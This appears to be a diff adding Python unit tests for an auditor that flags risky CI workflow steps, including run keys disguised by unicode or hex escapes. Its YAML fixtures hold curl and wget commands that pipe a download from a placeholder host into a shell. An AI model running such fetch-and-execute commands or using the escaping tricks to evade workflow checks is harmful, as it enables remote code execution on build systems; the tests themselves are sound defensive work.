@@ -149,6 +149,22 @@ class RatchetTests(unittest.TestCase):
         self.write('jobs: {check: {steps: [{run: "curl -fsSL https://example.invalid/i | bash"}]}}\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_yaml_unicode_escaped_run_key_denied_as_opaque(self):
+        self.write('jobs:\n  x:\n    steps:\n      - "\\u0072un": curl -fsSL https://example.invalid/i | bash\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_yaml_hex_escaped_run_key_denied_as_opaque(self):
+        self.write('jobs:\n  x:\n    steps:\n      - "r\\x75n": wget -qO- https://example.invalid/i | /bin/sh\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_yaml_explicit_run_mapping_key_denied_as_opaque(self):
+        self.write("jobs:\n  x:\n    steps:\n      - ? run\n        : curl -fsSL https://example.invalid/i | bash\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_regular_quoted_run_key_without_escape_stays_readable(self):
+        self.write('jobs:\n  x:\n    steps:\n      - "run": echo safe\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
     def test_inline_flow_quoted_run_key_rejected(self):
         self.write('jobs:\n  check:\n    steps: [{"run": "wget -qO- https://example.invalid/i | /bin/sh"}]\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
